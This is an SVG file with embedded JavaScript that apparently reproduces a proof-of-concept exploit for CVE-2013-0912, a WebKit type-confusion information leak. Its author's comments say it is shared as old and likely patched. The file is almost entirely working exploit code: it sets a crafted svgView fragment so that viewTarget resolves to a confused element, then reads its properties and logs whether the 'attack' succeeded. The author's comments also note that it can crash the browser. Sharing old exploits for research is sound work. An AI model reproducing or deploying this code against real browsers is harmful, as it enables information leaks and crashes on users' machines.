<svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject id='fo'>
          <body xmlns="http://www.w3.org/1999/xhtml">
           <rect id='fuckme'></rect>
          </body>
    </foreignObject>
<script>

// CVE-2013-0912
// https://labs.mwrinfosecurity.com/blog/2013/04/19/mwr-labs-pwn2own-2013-write-up---webkit-exploit/

// This is the re-engineered exploit for CVE-2013-0912 (Information leak vulnerabilities by type confusions).
// I've re-produced this exploits for the other work I'm doing,
// and it's good to share now since it is quite old and most chrome/safari must be patched.
// You will see SVG is pretty strange to work with,
// and I am wondering how MWR lab guys actually wrote the exploit code
// only by seeing that type-confusion vulnerable code in webkit. Just amazing.

var svg = document.childNodes[0];
var fo = svg.getElementById('fo');

var currentView = document.childNodes[0].currentView;
console.log("svg : " + svg);
console.log("svg.currentView : " + currentView);
var spec = "svgView(viewBox(100,500,300,1000);viewTarget(fuckme);zoomAndPan(disable))";
setTimeout(attack, 10);
document.location.hash = spec;

function attack() {
   console.log("attack");
   console.log('svg.currentView.viewTarget : ' + currentView.viewTarget);

    if (currentView.viewTarget) {
        console.log("seems attack successful");        
        console.log('keys of svg.currentView.viewTarget : ' + Object.keys(currentView.viewTarget));
        //crash
        console.log(currentView.viewTarget.className);
    }
    else {
        console.log("seems attack failed");
    }
}
    </script>
</svg>
